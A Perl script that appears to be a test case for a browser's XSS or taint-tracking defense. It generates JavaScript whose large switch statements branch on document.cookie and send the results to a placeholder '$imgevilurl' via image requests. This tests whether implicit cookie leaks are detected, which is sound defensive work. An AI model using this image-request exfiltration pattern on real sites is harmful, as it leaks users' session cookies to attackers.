#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_CASEX";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 1;
		switch(true) {
		  case (notevil == 1) :
			  notevil = 4;
			  break;|;
for ($i = 2; $i < 2600; $i++) {
print qq|
		  case (notevil == $i) :
			  notevil = $i;
			  break;|;
}
print qq|
		}
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val
		var notevil2 = 1;
		if ($evil) {
			switch(true) {
			  case (notevil2 == 1) :
				notevil2 = 4;
				break;|;
for ($i = 2; $i < 2600; $i++) {
print qq|
			  case (notevil2 == $i) :
			  notevil2 = $i;
			  break;|;
}
print qq|
			}
		}
		var url = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url;
		
		// normal usage
		var notevil3 = 1;
		var evil;
		if ($evil) {
			evil = 1;
		}
		switch(true) {
		  case (evil == 1) :
			notevil3 = 4;
			break;|;
for ($i = 2; $i < 2600; $i++) {
print qq|
		  case (evil == $i) :
			  notevil3 = $i;
			  break;|;
}
print qq|
		}
		document.images[2].src = "$imgevilurl?isevil=" + notevil3;
		
    </script>
|;

require "xss_basic_footer.pl";
